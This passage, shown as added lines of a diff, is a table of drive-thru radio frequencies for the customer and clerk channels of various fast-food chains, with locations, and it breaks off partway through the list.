+ RESTAURANT                 CUSTOMER (R)    CLERK (I)      LOCATION
+-------------------------------------------------------------------------------
+
+Arby's                       30.8400       154.5700      Nationwide
+
+Bess Eaton Donut            457.5375       467.7625      Rhode Island
+
+Big Boy                      30.8400       154.5700      UNKNOWN OH area
+                            457.6000       467.8250      UNKNOWN OH area
+
+Burger King                  30.8400       154.5700      UNKNOWN OH area
+                             31.0000       170.3050      UNKNOWN GA area
+                             33.4000       154.5400      Frederick, MD
+                            457.5500       467.7750      Baltimore, MD area
+                            457.5625       467.7875      Nationwide
+                            457.5750       467.8000      UNKNOWN area
+                            457.6000       467.8250      UNKNOWN area
+                            460.8875       465.8875      Nationwide
+                            461.5375       UNKNOWN       UNKNOWN OH area
+
+Burgerville                  30.8400       154.5700      UNKNOWN OH area
+
+Dairy Queen                  30.8400       154.5700      UNKNOWN OH area
+                            460.8875       465.8875      UNKNOWN OH area
+                            920.2625 WFM   UNKNOWN       Halifax, Nova Scotia
+
+Dunkin Donuts                30.8400       154.5700      UNKNOWN NH area
+                             33.1600       154.5150      UNKNOWN NH area
+                             33.4000       154.5400      UNKNOWN NH area     
+  
+
+El Mexicano                 464.9625       469.9625      Germantown, MD
+
+G.D. Ritzy's                 35.1000       UNKNOWN       UNKNOWN OH area
+
+Hardee's                     30.8400       154.5700      Nationwide
+                             31.0000       170.3050      UNKNOWN NC area
+                            457.5375       467.7625      UNKNOWN OH area
+                            460.8875       465.8875      UNKNOWN OH area
+                            461.0875       466.0875      UNKNOWN OH area
+                            461.1125       466.1125      Aurora, IL area
+
+Jack in the Box              33.4000       154.5400      San Jose, CA
+
+Kenny Rogers Roasters       469.0125       464.0125      Frederick, MD
+Chicken
+
+Kentucky Fried Chicken       30.8400       154.5700      Occoquan, VA area
+           
